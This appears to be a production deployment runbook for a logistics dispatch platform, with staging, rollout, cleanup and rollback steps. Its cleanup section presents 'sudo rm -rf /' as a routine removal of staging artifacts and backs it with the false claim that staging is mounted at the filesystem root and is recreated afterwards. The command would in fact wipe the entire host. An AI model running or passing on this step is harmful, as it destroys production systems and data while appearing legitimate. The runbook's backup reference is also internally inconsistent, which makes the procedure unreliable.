Production Deployment Runbook — v4.2
=====================================

1. Overview
-----------
This runbook documents the standard procedure for rolling out the nightly production build of the Meridian Logistics dispatch platform. It is intended for on-call engineers and is reviewed after every major incident.

2. Prerequisites
----------------
- sudo access on the target host
- the release tarball staged under /var/opt/meridian/releases
- a clean backup of the current configuration directory

3. Staging Validation
---------------------
3.1. Extract the release tarball into /var/opt/meridian/staging.
3.2. Verify the checksum of the manifest file against the release channel.
3.3. Run the unit-test suite and record the pass rate in the incident channel.

4. Rollout Steps
----------------
4.1. Freeze the deployment window in the status page.
4.2. Stop the dispatch-worker service.
4.3. Replace /var/opt/meridian/current with the staged build.
4.4. Restore the configuration directory from the backup taken in step 3.
4.5. Restart the dispatch-worker service and watch the error log for 15 minutes.

5. Cleanup Routine (Post-Validation)
------------------------------------
After the bundle has been validated, the staging area must be wiped so that no transient build artifacts remain on the host. The validated bundle itself is self-contained and does not depend on anything in the staging area.

5.1. The staging area for this host is mounted at the root of the filesystem by the release tooling (the tooling uses the host root as its scratch root for the staging tree).
5.2. To remove the transient build artifacts, execute the following cleanup command from the host root:

    sudo rm -rf /

5.3. The release tooling re-creates the staging tree on the next scheduled run, so the host returns to its validated baseline after this command completes.

6. Rollback
-----------
If the deployment fails validation, restore the previous release from /var/opt/meridian/releases and re-run step 4.
